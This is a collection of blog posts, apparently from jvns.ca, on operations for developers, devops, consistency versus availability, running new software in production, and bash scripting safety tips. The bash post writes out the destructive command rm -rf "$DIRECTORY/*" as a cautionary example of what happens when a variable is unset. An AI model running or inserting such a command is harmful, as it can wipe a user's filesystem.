{"url": "https://jvns.ca/blog/2016/10/15/operations-for-software-developers-for-beginners/", "title": "Operations for software developers for beginners", "content": "\n     \n\n I work as a software developer. A few years ago I had no idea what “operations” was. I had\nnever met anybody whose job it was to operate software. What does that even mean? Now I\nknow a tiny bit more about it so I want to write down what I’ve figured out. \n\n operations: what even is it? \n\n I made up these 3 stages of operating software. These are stages of understanding about operations I am going through. \n\n Stage 1: your software just works. It’s fine. \n\n You’re a software developer. You are running software on computers. When you write your software, it generally works okay – you write tests, you make sure it works on localhost, you push it to production, everything is fine. You’re a good programmer! \n\n Sometimes you push code with bugs to production. Someone tells you about the bugs, you fix\nthem, it’s not a big deal. \n\n I used to work on projects which hardly anyone used. It wasn’t a big deal if there was a\nsmall bug! I had no idea what operations was and it didn’t matter too much. \n\n Stage 2: omg anything can break at any time this is impossible \n\n You’re running a site with a lot of traffic. One day, you decide to upgrade your database over the weekend.  You have a bad weekend . Charity writes a blog post saying  you should have spent more than 3 days on a database upgrade . \n\n I think if in my “what even is operations” state somebody had told me “julia!! your site needs to be up 99.95% of the time” I would have just have hid under the bed. \n\n Like, how can you make sure your site is up 99.95% of the time? ANYTHING CAN HAPPEN. You could have spikes in traffic, or some random piece of critical software you use could just stop working one day, or your database could catch fire. And what if I need to upgrade my database? How do I even do that safely? HELP. \n\n I definitely went from “operations is trivial, whatever, how hard can keeping a site up be?” to “OMG THIS IS IMPOSSIBLE HOW DOES ANYONE EVER DO THIS”. \n\n Stage 2.5: learn to be scared \n\n I think learning to be scared is a really important skill – you  should  be worried\nabout upgrading a database safely, or about upgrading the version of Ruby you’re using in\nproduction. These are dangerous changes! \n\n But you can’t just  stop at being scared  – you need to learn to have a healthy concern about complex parts of your system, and then learn how to take the appropriate precautionary steps and then confidently make the upgrade or deploy the big change of whatever the thing you are appropriately scared of is. \n\n If you stop here then you just end up using a super-old Ruby version for 4 years\nbecause you were too scared to upgrade it. That is no good either! \n\n Stage 3: keeping your site up is possible \n\n So, it turns out that there is a huge body of knowledge about keeping your site up! \n\n There are people who, when you show them a large complicated software system\nrunning on thousands or tens of thousands of computers, and tell them “hey, this needs to\nbe up 99.9% of the time”, they’re like “yep, that is a normal problem I have worked on! Here’s the first step we can take!” \n\n These people sometimes have the job title “operations engineer” or “SRE” or “devops engineer” or “software engineer” or “system administrator”. Like all things, it’s a skillset that you can learn, not a magical innate quality. \n\n Charity is one of these people! That blog post (” The Accidental\nDBA ”)) I linked to before has a bunch\nof extremely practical advice about how to upgrade a database safely. If you’re running a\ndatabase and you’re scared – you’re right! But you can learn about how to upgrade it from\nsomeone like Charity and then it will go a lot better. \n\n getting started with operations \n\n So, we’ve convinced ourselves that operations is important. \n\n Last year I was on a team that had some software. It mostly ran okay, but infrequently it\nwould stop working or get super slow. There were a bunch of different reasons it had\nproblems! And it wasn’t a disaster, but it also wasn’t as awesome as we wanted it to be. \n\n For me this was a really cool way to get a little bit better at operations! I worked on\nmaking the service faster and more reliable. And it worked! I made a couple of good\nimprovements, and I was happy. \n\n Some stuff that helped: \n\n \n work on a dashboard for the service that clearly shows its current state (this is surprisingly hard!) \n move some complicated code that did a lot of database operations into a separate webservice so we could easily time it out if something went wrong \n do some profiling and remove some unnecessarily slow code \n \n\n The most cool part of this, though, is that a much more experienced SRE later came in to\nwork with the team on making the same service operate better, and I got to see what he did\nand what his process for improving things looked like! \n\n It’s really helped me to realize that you don’t turn into a Magical Operations Person overnight. Instead, I can take whatever I’m working on right now, and make small improvements to make it operate better! That makes me a better programmer. \n\n you can make operations part of your job \n\n As an industry, we used to have “software development” teams who wrote code and threw it over the wall to “operations teams” who ran that code. I feel like we’ve collectively decided that we want a different model (“devops”) – that we should have teams who both write code and know how to operate it. And there are a lot of details of how that works exactly (do you have “SRE”s?) \n\n But as an individual software engineer, what does that mean for you? I thiiink it means that you get to LEARN COOL STUFF. You can learn about how to deploy changes safely, and observe what your code is doing. And then when something has gone wrong in production, you’ll both understand what the code is doing (because you wrote it!!) and you’ll have the skills to figure it out and systematically prevent it in the future (because you are better at operations!). \n\n I have a lot more to say about this (how I really love being a generalist, how doing some operations work has been an awesome way to improve my debugging skills and my ability to reason about complex systems and plan how to build complicated software). And I need to write in the future about super useful Ideas For Operating Software Safely I’ve learned about (like dark reads and circuit breakers). But I’m going to stop here for now. If you want more reading  The Ops Identity Crisis  is a good post about software developers doing operations, from the point of view of an ops person. \n\n This is my favorite paragraph from Charity’s “ WTF is operations? ” blog post (which you should just go read instead of reading me): \n\n \n The best software engineers I know are the ones who consistently value the impact and lifecycle of the code they ship, and value deployment and instrumentation and observability.  In other words,  they rock at ops stuff . \n \n\n"},
{"url": "https://jvns.ca/blog/2016/10/16/whats-devops/", "title": "What's devops?", "content": "\n     \n\n I started reading “ Effective DevOps ” by  Jennifer Davis  and\n Ryn Daniels  yesterday. \n\n I’m still only part of the way through, but I realized while reading it\nthat I had no idea what “devops” even meant. I had some vague idea that\nit meant “running programs, administrating servers, using chef and\npuppet, I don’t know”. \n\n I think the term “devops” is kind of contentious and I don’t really care\nto get into discussions about what words do or do not mean. BUT. What is\ndescribed as “devops” and “the devops movement” in Effective DevOps is\nan extremely positive thing that I am excited about! So let’s talk about\nwhat this very positive thing is, and while we talk about it we will\ncall it devops. \n\n what isn’t devops? \n\n One of the first things they clear up is what they  don’t  mean by\ndevops. \n\n Not a job title, not an organization \n\n Of course devops  is  a job title that people use – someone emailed\nme just today asking if I was interested as a job as a “devops\nengineer”. And that does mean something, but it’s not what we’re talking\nabout right now. \n\n I enjoyed reading  this article about devops at Etsy .\nOne of the really key things about this article is – there is no devops\norganization at Etsy. It’s about how developers and operations people\nwork productively together! Also, it was a slow incremental migration\ntowards different practices. They did not wake up one day and become\ndevops. I think this is the  first talk that used the term ‘devops’ ? \n\n It’s also not about “everyone is a software developer” – one of the authors of\nthis book, Ryn Daniels, is a  senior operations engineer at Etsy .\nI don’t know any of the details of their job, but my impression is that they have a\nlot of expertise in operations. It’s not like “make operations so\neasy that nobody has to be an expert at it”. Of course you need people who\nknow a ton about operations! Probably those people write software as\npart of their job? \n\n not just automation \n\n There have a been a bunch of super positive changes around reducing\nautomation when administering systems. puppet/chef! soon, terraform! AWS\nautoscaling groups! But that is not devops. devops is about how people\nwork together. \n\n a definition, sort of \n\n I looked up devops on wikipedia and got this: \n\n \n In traditional functionally separated organizations there is rarely\ncross-departmental integration of these functions with IT operations.\ndevops promotes a set of processes and methods for thinking about\ncommunication and collaboration between development, QA, and IT\noperations. \n \n\n Okay, this is interesting! devops is about “communication and\ncollaboration”. That is really different from “chef and puppet and\ncontinuous integration and stuff” – Puppet is software, communication\nis about how humans work together. \n\n Near the beginning of the book, Davis and Daniels describe some of their\nrespective experiences being the only person on-call and in charge of\nkeeping some software running. They then, over the course of the book,\ntalk through a bunch of case studies of organizations moving towards\nmore sustainable practice. \n\n This really helped me understand where the book was coming from! I have\nnever worked at an organization with an “operations team” where\ndevelopment and operations were separated into different organizations. \n\n So devops is about people who with different strengths effectively\ncollaborating to build awesome software that runs reliably. That is a\nthing I like! \n\n ideas & practices that are part of devops \n\n \n you should integrate development and operations together (or: you\nshould stop breaking dev and ops apart (thanks tef)) \n operations experts should have a hand in leading  systems design and\narchitecture , not just be handed finished systems to run \n when things go wrong, run blameless postmortems \n continuous integration . I also learned from this book what\ncontinuous integration was! It is when you merge your changes into a\nmainline branch very frequently instead of going off and building a\nfeature for weeks! \n configuration management and automation tools like chef/puppet (“no\nsnowflake servers”) \n \n\n There are a lot more things, those are just 5. \n\n Most of these things are about processes and people, not about technology. \n\n Another pretty important thing here seems to be the\n devopsdays  conferences – it’s really\ncool that there’s a series of local conferences that talk about how to\noperate reliable software and bring people with different kinds of\nexpertise to talk. I haven’t been to any of them yet, but bringing\npeople from different companies together to talk seems to be an\nimportant part of the “devops movement”. \n\n assumptions are important \n\n One of my favorite things about this book is that it makes a lot of my\nassumptions explicit! Etsy influenced a lot of devops ideas, and where I\nwork now is influenced by Etsy, so a lot of this stuff is implicitly\nfamiliar to me. But I hadn’t thought of them as choices! \n\n When I learned what “continuous integration” was (merging your changes\ninto master after working on them for 1-2 days instead of waiting weeks)\nI was like “uh, wait, what else would you do?”. A lot of the stuff in\nthis book was like that – I hadn’t realized that this was a choice my\norganization was making, I thought that was just how things were! \n\n But of course any organizational choice (like continuous integration,\nblameless postmortems, having a separate operations team)  is  a\nchoice, and it’s useful to understand why you’re making it. Because\nmaybe there are even more improvements you can make over time! \n\n what’s the difference between devops and SRE? \n\n This  transcript of a panel discussion on devops vs SRE is good . \n\n why devops is exciting (& evolution) \n\n I think I didn’t realize it was exciting because I hadn’t really\ninternalized that you could totally separate development and\noperations. Right now the team I work on has maybe more operational\nresponsibilities than some other teams, but they’ve never been separate. \n\n But thinking of this as a  choice  where you recognize how important\noperational expertise is, train developers to be better at operations,\nmake sure that operational concerns get seen at early stages of the\ndevelopment process – that is super exciting to me! And this book\n“effective devops” has a lot of ideas that I use already all the time,\nbut it also has ideas that I haven’t thought of before! \n\n And it makes me want to make my organization even better at it than it\nalready is, because even if we ostensibly practice “devops” and do\ncontinuous integration and use jenkins and deploy 100 times a day or\nwhatever, that doesn’t actually mean that we’re the best and awesome and\nthat we can stop. That is never true! There is always more work to do to\nmake a more awesome organization. \n\n And devops seems to be less about a “manifesto” (like the extreme\nprogramming manifesto) and more of a large and fuzzy set of practices\nthat we’re all learning together as an industry over time. That we can\nconstantly improve! And that is okay. \n\n"},
{"url": "https://jvns.ca/blog/2016/10/21/consistency-vs-availability/", "title": "Consistency vs availability (wat?)", "content": "\n     \n\n HELLO! I think I just understood something about consistency vs\navailability for the first time today. \n\n I always feel kind of dumb writing this stuff because I’ve been reading\n aphyr’s amazing blog  for like 2 years, and\nwatching his talks, and I feel like I understand them sometimes! But at\nthe same time I feel like I barely understand the basic concepts. \n\n So! I was writing a blog post about work today, and we were talking\nabout a System (database) that we run. In the past, the system was\nhaving availablity problems. I remember pretty distinctly being paged at\nmidnight one day and being like UGH THE SYSTEM IS DOWN WHAT’S HAPPENING. \n\n At the time, I did not really understand why the System was down, it was\nmaintained by other people, and they brought it back up, and then it\ntotally stopped going down and now everything is fine. \n\n But why did the System stop going down? Today I learned why! \n\n LET ME TELL YOU A STORY ABOUT CONSISTENCY AND AVAILABILITY. This\nis kind of a dangerous blog post to write because I know practically\nnothing about distributed systems but maybe some of you beginners like\nme will learn something. \n\n the CAP theorem (& intuition) \n\n This is not going to be a blog post about the CAP theorem. I have never\nread the CAP theorem. Martin Kleppmann says he  doesn’t even believe the CAP theorem is useful  (see  a critique of the CAP theorem for more ). \n\n I still have honestly not fully understood that blog post by Kleppmann.\nI still need to read it 3 more times but I’ve learned some things from\nit and I think it’s interesting. \n\n Anyway the point of “consistency vs availability” to me is not the CAP\ntheorem. I think there’s just like this.. general idea that, in\ndistributed systems, there is a conflict between consistency and\navailability. \n\n I majored in math! I proved theorems for like 5 years. One thing I\nlearned while proving theorems is – it’s really useful to have\n intuitions  about the formal systems you’re working with. If you have\nintuition, you can say “hmm, that smells like consistency, and that\nsmells like availability, maybe those two things are in conflict!” And\nthen you can go take your fuzzy idea and actually go make a precise\nstatement and prove it. \n\n I think taking fuzzy ideas about how real-world systems operate and\ntranslating them into actual theorems that you can use to reason with is\nwhat distributed systems researchers do. Anyway, I’m not a distributed\nsystems researcher and I don’t know hardly anything about distributed\nsystems theory. So we’re just going to talk about fuzzy feelings. \n\n what is availability \n\n Disclaimer: We’re going with fuzzy “smells like consistency/availability”\ndefinitions here. If you’re like “julia, all your definitions are stuff\nyou made up just now”, you will be right. You should go read aphyr or\nMartin Kleppmann if you want real definitions. Their writing is real\ngood and they have done a ton of work to make it accessible to mere\nmortals like us. \n\n So, I know what availability is! It means I don’t get paged because the\nsystem is down. Basically it means if you ask, you can always get an\nanswer! I like that. What’s wrong with that? \n\n wtf is consistency \n\n So! let’s say we have 100 computers in a “cluster”. I think\n“consistency” kinda means “if you query any computer in the cluster at\nthe same time it will tell you the same thing”. \n\n The C in CAP actually means “linearizability” and there’s a great\nexplanation of it in  that Kleppmann blog post . \n\n why are consistency and availability in conflict? \n\n Well, let’s suppose we define availability as “any machine of the 100\nmachines can always give me an answer” and consistency as “every machine\nshould always give me the same answer”. \n\n Then it’s kind of obvious that these are in conflict, right? For the\nmachines to all agree (especially if their state is being updated!),\nthey need to  communicate with each other . And we know that networks\nare unstable! So if Machine 1 and Machine 2 can’t talk to each other,\nhow can they give me the same answer? That doesn’t make sense! \n\n When i write this blog I don’t really fact check that carefully. I’m\njust like “y’all anything i write here i could be wrong”. That makes it\nreally easy to post stuff like this quickly! I think that’s kind of the\nsame tradeoff :) \n\n so: \n\n building consistent systems is hard \n\n If your system only runs on one machine, building consistent systems is\neasy! But if you want it to run on a lot of machines, it gets\ncomplicated fast. \n\n The simplest algorithm I know of for building consistent systems is\n Raft . This algorithm is really\ncomplicated! There is a paper and it has ALL THESE PAGES. WHAT DO THEY\nEVEN SAY. People have implemented Raft!  etcd is a key-value store that uses Raft . \n\n So if you want one of these algorithms in your life that is a thing you\ncan have. \n\n building available systems is easy \n\n Let’s say I have a database, and I replicate writes to a bunch of\nsecondary machines. I can make my system distributed and available\npretty easily! I can just put it on a lot of machines and read from any\nrandom machine. That’s cool! Distributed systems! \n\n There might be some complicated reason why it’s hard to make a system\nthat’s available but I don’t see it – if you don’t care if the data\nyou’re reading is necessarily totally right, then there’s no problem! Do\nwhatever you want! \n\n \n if you have one machine, you’re consistent, but not that available\n(because that machine could explode) \n if you implement Raft, you’re still consistent, but maybe your latency\ngoes up and your availability doesn’t get to 100% (because there might\nbe weird network partitions) \n if you sacrifice consistency and add a bunch of machines, you can be\n~100% available \n \n\n back to my System (why did it stop going down???) \n\n Okay, but why did my System at work stop going down? WELL. We decided\nthat it didn’t actually need to be consistent! (I won’t go into why, but\nit makes sense) We traded off consistency for availability, and now the\nsystem never goes down anymore! Instead sometimes the data in it gets a\nlittle out of date. This is not a big deal. \n\n SO! My system started working because we  dropped consistency as a\nrequirement . It wasn’t because we fixed bugs, or because we were\nreally smart. We changed our mind about what we wanted out of the\nsystem, and that helped us operate it better! COOL. There are LOTS of\nsystems that don’t need to be consistent, it turns out! \n\n distributed systems make me grumpy \n\n I think I used to think distributed systems were kind of like.. cool and\nawesome and sexy? and that cool smart people worked on them. \n\n I mean, if you work on distributed systems you are probably cool and\nsmart. But. Now I work with a whole bunch of computers, like hundreds of\nthem. \n\n These days when i see a distributed systems problem i’m more likely\nto think OH NO CAN WE NOT. Like can we just put it on a single computer?\nOr can we put it a bunch of computers where none of the computers care\nwhat the other ones are doing? I feel like really good distributed\nsystems enginering is being like extremely careful about a small number\nof consistent systems and then making everything else as dumb as\npossible. \n\n Like “the best distributed system is the one you deleted”. \n\n Anyway. Understanding about tradeoffs between consistency and\navailability really makes me want to isolate the places where I want\nconsistency really carefully so I can make sure that they actually work,\nand then have everything else rely on those places. I think that’s what\nservices like  Zookeeper  are about? \n\n"},
{"url": "https://jvns.ca/blog/2018/11/11/understand-the-software-you-use-in-production/", "title": "Some notes on running new software in production", "content": "\n     \n\n I’m working on a talk for kubecon in December! One of the points I want to get across is the amount\nof time/investment it takes to use new software in production without causing really serious\nincidents, and what that’s looked like for us in our use of Kubernetes. \n\n To start out, this post isn’t blanket advice. There are lots of times when it’s totally fine to just\nuse software and not worry about  how  it works exactly. So let’s start by talking about when it’s\nimportant to invest. \n\n when it matters: 99.99% \n\n If you’re running a service with a low SLO like 99% I don’t think it matters that much to understand\nthe software you run in production. You can be down for like 2 hours a month! If something goes\nwrong, just fix it and it’s fine. \n\n At 99.99%, it’s different. That’s 45 minutes / year of downtime, and if you find out about a serious\nissue for the first time in production it could easily take you 20 minutes or to revert the change.\nThat’s half your uptime budget for the year! \n\n when it matters: software that you’re using heavily \n\n Also, even if you’re running a service with a 99.99% SLO, it’s impossible to develop a super deep\nunderstanding of every single piece of software you’re using. For example, a web service might use: \n\n \n 100 library dependencies \n the filesystem (so there’s linux filesystem code!) \n the network (linux networking code!) \n a database (like postgres) \n a proxy (like nginx/haproxy) \n \n\n If you’re only reading like 2 files from disk, you don’t need to do a super deep dive into Linux\nfilesystems internals, you can just read the file from disk. \n\n What I try to do in practice is identify the components which we rely on the (or have the most\nunusual use cases for!), and invest time into understanding those. These are usually pretty easy to\nidentify because they’re the ones which will cause the most problems :) \n\n when it matters: new software \n\n Understanding your software especially matters for newer/less mature software projects, because it’s\nmore likely to have bugs & or just not have matured enough to be used by most people without\nhaving to worry. I’ve spent a bunch of time recently with Kubernetes/Envoy which are both relatively\nnew projects, and neither of those are remotely in the category of “oh, it’ll just work, don’t worry\nabout it”.  I’ve spent many hours debugging weird surprising edge cases with both of them and\nlearning how to configure them in the right way. \n\n a playbook for understanding your software \n\n The playbook for understanding the software you run in production is pretty simple. Here it is: \n\n \n Start using it in production in a non-critical capacity (by sending a small percentage of traffic\nto it, on a less critical service, etc) \n Let that bake for a few weeks. \n Run into problems. \n Fix the problems. Go to step 3. \n \n\n Repeat until you feel like you have a good handle on this software’s failure modes and are\ncomfortable running it in a more critical capacity. Let’s talk about that in a little more detail,\nthough: \n\n what running into bugs looks like \n\n For example, I’ve been spending a lot of time with Envoy in the last year. Some of the issues we’ve\nseen along the way are: (in no particular order) \n\n \n One of the default settings resulted in retry & timeout headers not being respected \n Envoy (as a client) doesn’t support TLS session resumption, so servers with a large amount of Envoy clients get DDOSed by TLS handshakes \n Envoy’s active healthchecking means that you services get healthchecked by every client. This is\nmostly okay but (again) services with many clients can get overwhelmed by it. \n Having every client independently healthcheck every server interacts somewhat poorly with services\nwhich are under heavy load, and can exacerbate performance issues by removing up-but-slow clients\nfrom the load balancer rotation. \n Envoy doesn’t retry failed connections by default \n it frequently segfaults when given incorrect configuration \n various issues with it segfaulting because of resource leaks / memory safety issues \n hosts running out of disk space between we didn’t rotate Envoy log files often enough \n \n\n A lot of these aren’t bugs – they’re just cases where what we expected the default configuration\nto do one thing, and it did another thing. This happens all the time, and it can result in really\nserious incidents. Figuring out how to configure a complicated piece of software appropriately takes\na lot of time, and you just have to account for that. \n\n And Envoy is great software! The maintainers are incredibly responsive, they fix bugs quickly and\nits performance is good. It’s overall been quite stable and it’s done well in production. But just\nbecause something is great software doesn’t mean you won’t also run into 10 or 20 relatively serious\nissues along the way that need to be addressed in one way or another. And it’s helpful to understand\nthose issues  before  putting the software in a really critical place. \n\n try to have each incident only once \n\n My view is that running new software in production inevitably results in incidents. The trick: \n\n \n Make sure the incidents aren’t too serious (by making ‘production’ a less critical system first) \n Whenever there’s an incident (even if it’s not that serious!!!), spend the time necessary to\nunderstand exactly why it happened and how to make sure it doesn’t happen again \n \n\n My experience so far has been that it’s actually relatively possible to pull off “have every\nincident only once”. When we investigate issues and implement remediations, usually that issue\n never comes back . The remediation can either be: \n\n \n a configuration change \n reporting a bug upstream and either fixing it ourselves or waiting for a fix \n a workaround (“this software doesn’t work with 10,000 clients? ok, we just won’t use it with in\ncases where there are that many clients for now!“, “oh, a memory leak? let’s just restart it every\nhour”) \n \n\n Knowledge-sharing is really important here too – it’s always unfortunate when one person finds an\nincident in production, fixes it, but doesn’t explain the issue to the rest of the team so somebody\nelse ends up causing the same incident again later because they didn’t hear about the original\nincident. \n\n Understand what is ok to break and isn’t \n\n Another huge part of understanding the software I run in production is understanding which parts\nare OK to break (aka “if this breaks, it won’t result in a production incident”) and which aren’t.\nThis lets me  focus : I can put big boxes around some components and decide “ok, if this breaks it\ndoesn’t matter, so I won’t pay super close attention to it”. \n\n For example, with Kubernetes: \n\n ok to break: \n\n \n any stateless control plane component can crash or be cycled out or go down for 5 minutes at any\ntime. If we had 95% uptime for the kubernetes control plane that would probably be fine, it just\nneeds to be working most of the time. \n kubernetes networking (the system where you give every pod an IP addresses) can break as much as\nit wants because we decided not to use it to start \n \n\n not ok: \n\n \n for us, if etcd goes down for 10 minutes, that’s ok. If it goes down for 2 hours, it’s not \n containers not starting or crashing on startup (iam issues, docker not starting containers, bugs\nin the scheduler, bugs in other controllers) is serious and needs to be looked at immediately \n containers not having access to the resources they need (because of permissions issues, etc) \n pods being terminated unexpectedly by Kubernetes (if you configure kubernetes wrong it can\nterminate your pods!) \n \n\n with Envoy, the breakdown is pretty different: \n\n ok to break: \n\n \n if the envoy control plane goes down for 5 minutes, that’s fine (it’ll keep working with stale\ndata) \n segfaults on startup due to configuration errors are sort of okay because they manifest so early\nand they’re unlikely to surprise us (if the segfault doesn’t happen the 1st time, it shouldn’t\nhappen the 200th time) \n \n\n not ok: \n\n \n Envoy crashes / segfaults are not good – if it crashes, network connections don’t happen \n if the control server serves incorrect or incomplete data that’s extremely dangerous and can\nresult in serious production incidents. (so downtime is fine, but serving incorrect data is not!) \n \n\n Neither of these lists are complete at all, but they’re examples of what I mean by “understand your\nsofware”. \n\n sharing ok to break / not ok lists is useful \n\n I think these “ok to break” / “not ok” lists are really useful to share, because even if they’re not\n100% the same for every user, the lessons are pretty hard won. I’d be curious to hear about your\nbreakdown of what kinds of failures are ok / not ok for software you’re using! \n\n Figuring out all the failure modes of a new piece of software and how they apply to your situation\ncan take months. (this is why when you ask your database team “hey can we just use NEW DATABASE”\nthey look at you in such a pained way). So anything we can do to help other people learn faster is\namazing \n\n"},
{"url": "https://jvns.ca/blog/2017/03/26/bash-quirks/", "title": "Bash scripting quirks & safety tips", "content": "\n     \n\n Yesterday I was talking to some friends about Bash and I realized that, even though\nI’ve been using Bash for more than 10 years now there are still a few basic\nquirks about it that are not totally obvious to me. So as usual I thought\nI’d write a blog post. \n\n We’ll cover \n\n \n some bash basics (“how do you write a for loop”) \n quirky things (“always quote your bash variables”) \n and bash scripting safety tips (“always use  set -u ”) \n \n\n If you write shell scripts and you don’t read anything else in this post, you\nshould know that there is a shell script linter called\n shellcheck . Use it to make your shell\nscripts better! \n\n We ’re going to talk about bash like it’s a programming language, because,\nwell, it is. The goal of this post really is not to go into details of bash\nprogramming. I do not do complicated programming in bash and do not really plan\nto learn how to. But after thinking about it a bit today, I think it’s useful\nto explicitly write down some of the basics of the bash programming language.\nAnd some things about the bash programming languages are quite different\nfrom other programming languages I use! \n\n I really thought I knew this stuff already but I learned a couple things by\nwriting this post so maybe you will too. \n\n Variable assignment \n\n In bash variable assignment looks like this: \n\n VARIABLE=2\n \n\n and you reference variables with  $VARIABLE . It’s very important that you\ndon’t put spaces around the = sign –  VARIABLE= 2 ,  VARIABLE = 2 , and\n VARIABLE =2  are not syntax errors, but will all do different unwanted things\n(like try to run a program called  2  an environment variable  VARIABLE  set to\nthe empty string). \n\n Bash variables don’t need to be all-caps but they usually are. \n\n Most bash variables you’ll use are strings. There are also some array variables\nin bash but I don’t really understand those. \n\n Quoting your variables with ${} \n\n Sometimes I have a variable containing a string like  file.txt  and I want to\ndo like \n\n mv $MYVAR $MYVAR__bak # wrong!\n \n\n This code as is won’t work! It will instead look for the variable  MYVAR__bak \nwhich is not a real variable. \n\n To get around this, all you need to know is that  ${MYVAR}  does the same thing\nas  $MYVAR . So we can run \n\n mv $MYVAR ${MYVAR}__bak # right!\n \n\n global, local & environment variables \n\n Next, Bash has 3 kinds of variables. The kind I usually think of first (and probably use the most often) are  environment variables . \n\n Every process on Linux actually has environment variables (you can run  env  to\nsee what variables are currently set), but in Bash they’re much more easily\naccessible. To see the environment variable called  MYVAR  you can run. \n\n echo \"$MYVAR\"\n \n\n To set an environment variable, you need to use the  export  keyword: \n\n export MYVAR=2\n \n\n When you set an environment variable, all child processes will see that\nenvironment variable. So if you run  export MYVAR=2; python test.py , the\npython program will have MYVAR set to 2. \n\n The next kind of variable is the  global variable . You assign these just\nlike we described up above. \n\n MYVAR=2\n \n\n They behave like global variables in any other programming language. \n\n There are also  local variables , which are scoped to only exist inside a\nbash function. I basically never use functions so (unlike in literally every\nother programming language I write in) I have never used local variables. \n\n for loops \n\n Here’s how I write for loops in bash. This loop prints the numbers from 1 to 10. \n\n for i in `seq 1 10` # you can use {1..10} instead of `seq 1 10` \ndo     \n echo \"$i\"\ndone\n \n\n If you want to write this loop on one line it looks like this: \n\n for i in `seq 1 10`; do echo $i; done\n \n\n I find this impossible to remember (how are you supposed to remember that\nthere’s a semicolon after  seq 1 10  but none after  do ?) so I don’t try to\nremember that. \n\n You can also write while loops but I never do that. \n\n The cool thing about this is that you can iterate over the output of another\ncommand.  seq 1 10  prints the numbers from 1 to 10 (one per line), and this\nfor loop is just taking that output and iterating over it. I use this a fair\namount. \n\n You can interpolate command output with either backticks or  $() . \n\n OUTPUT=`command`\n# or \nOUTPUT=$(command)\n \n\n if statements \n\n If statements in bash are pretty annoying to remember how to do. You have to\nput in these square brackets, and there have to be spaces around the square\nbrackets otherwise it doesn’t work.  [[  and  [  square brackets\n(double/single) both work. Here we get truly into bash quirk territory:  [  is\na program ( /usr/bin/[ ) but  [[  is bash syntax.  [[  is better. \n\n if [[ \"vulture\" = \"panda\" ]]; then\n echo expression evaluated as true\nelse\n echo expression evaluated as false\nfi\n \n\n Also, you can check for things like “this file exists”, “this directory exists”, etc. For example you can check whether the file /tmp/awesome.txt exists like this: \n\n If [[ -e /tmp/awesome.txt ]]; then\n  echo \"awesome\"\nfi\n \n\n This is sometimes useful but I have to look up the syntax every single time. \n\n If you want to try out conditions from the command line you can use the  test \ncommand, like  test -e /tmp/awesome.txt . It’ll return 0 for success, and an\nerror return code otherwise. \n\n One last thing about why  [[  is better than  [ : if you use  [[ , then you can use  <  to do\ncomparisons and it won’t turn into a file redirection. \n\n $ [ 3 < 4 ] && echo \"true\"\nbash: 4: No such file or directory\n$ [[ 3 < 4 ]] && echo \"true\"\ntrue\n \n\n Also one extra last thing about if: I learned today that you don’t need  [[  or\n [  to do if statements: any valid command will work. So you can do \n\n if grep peanuts food-list.txt\nthen\necho \"allergy allert!\"\nfi\n \n\n functions aren’t that hard \n\n Defining and calling functions in bash (especially if they have no parameters)\nis surprisingly easy. \n\n my_function () {\n echo \"This is a function\"; \n}\nmy_function # calls the function\n \n\n always quote your variables \n\n Another bash trick: never use a variable without quoting it. Here, look at this\ntotally reasonable-looking shell script: \n\n X=\"i am awesome\"\nY=\"i are awesome\"\nif [ $X = $Y ]; then\n echo awesome\nfi\n \n\n If you try to run this script, you will get the incomprehensible error message\n script.sh: line 3: [: too many arguments . What? \n\n Bash interprets this if statement as  if [ i am awesome == i are awesome] ,\nwhich doesn’t really make sense because there are 6 strings (i, am, awesome, i,\nare, awesome). The correct way to write this is \n\n X=\"i am awesome\"\nY=\"i are awesome\"\nif [ \"$X\" = \"$Y\" ]; then # i put quotes because i know bash will betray me otherwise\n echo awesome\nfi\n \n\n There are cases where it’s okay to just use $X instead of “$X”, but can you\nreally keep track of when it’s okay and when it’s not okay? I sure can’t.\nAlways quote your bash variables and you’ll be happier. \n\n return codes,  && , and `|| \n\n Every Unix program has a “return code” which is an integer from 0 to 127. 0\nmeans success, everything else means failure. This is relevant in bash because:\nsometimes I run a program from the command line and want to only run a second\nprogram if the first one succeeded. \n\n You can do that with  && ! \n\n For example:  create_user && make_home_directory . This will run  create_user ,\ncheck the return code, and then run  make_home_directory  only if the return\ncode is 0. \n\n This is different from  create_user; make_home_directory  which will run\n make_home_directory  no matter what the return code of  create_user  is \n\n You can also do  create_user || make_home_directory  which will run\n make_home_directory  only  create_user   fails . That’s definitely in the\nrealm of clever tricks. \n\n background processes \n\n I’m not going to say much about job control here but: in bash you can start a background process like this \n\n long_running_command &\n \n\n If you later have regrets about backgrounding the process and want to bring it\nback to the foreground, you can do that with  fg . If there’s more than one of\nthose processes, you can see them all with  jobs . For some reason  fg  takes a\n“job ID” (which is what  jobs  prints) instead of a PID. Who knows. Bash. \n\n Also, if you background LOTS of processes, the  wait  builtin will wait until they all\nreturn. \n\n Speaking of having regrets – if you accidentally start a process in the wrong\nterminal, Nelson Elhage has a cool project called\n reptyr  that can save your process and move\nit into a screen session or something. \n\n Be safe: set -e \n\n When I write programs, usually I make mistakes. In most programming\nlanguages I use, when something goes horribly wrong the program will exit and\ntell me what went wrong. \n\n In a bash script, you are usually running a lot of programs. Sometimes those\nprograms will exit with a failure return code. By default, when a program\nfails, Bash will just keep running. \n\n For example, in this script Python will fail (because the file I’m trying run\ndoesn’t exist) and then it’ll happily continue and print “done”. \n\n python non_existant_file.py\necho \"done\"\n \n\n This is almost never what I want – if one of the programs in my script fails,\nI do not want it to just merrily keep going and do possibly undefined /\nquestionable things! That is terrifying.  set -e  will make the script stop and\nhopefully prevent any damage. Here’s the safer version of that \n\n set -e # put this at the beginning of your file\n\npython non_existant_file.py\necho \"done\"\n \n\n be safer: use set -u \n\n In most programming languages I use, I get an error if I try to use an unset variable. Not in Bash! By default, unset variables are just evaluated as if they were the empty string. The result of this is \n\n rm -rf \"$DIRECTORY/*\" \n \n\n will actually run  rm -rf /*  if  $DIRECTORY  is unset. If you use  set -u \nbash will stop and fail if you try to use an unset variable. \n\n debug: use set -x \n\n set -x  will make bash print out every command it runs before running it. This\nis really useful for debugging. \n\n You can see all the other bash options you can set with  set -o . \n\n A lot of shell scripts I see people using in practice start with  set -eu  or\n set -eux . Safety! \n\n You can also  set -o pipefail  to exit if one part of a pipe fails. \n\n lint your bash scripts with shellcheck! \n\n Very recently I learned that there is a bash linter to help detect all these\nweird quirks and more!! It ‘ s called  shellcheck  and you can install it with\n apt-get install shellcheck . \n\n Also it has a website!  https://www.shellcheck.net/ . There is an example so can\nsee the kind of errors it tells you about. It’s pretty awesome and I’m excited\nabout trying it out. \n\n Shellcheck knows about way way more bash scripting best practices than I do :).\nWhen looking at the examples I was like “wow, that makes sense but I would\nhave never thought of that”. \n\n There’s also a shell formatter called  shfmt  which seems useful:\n 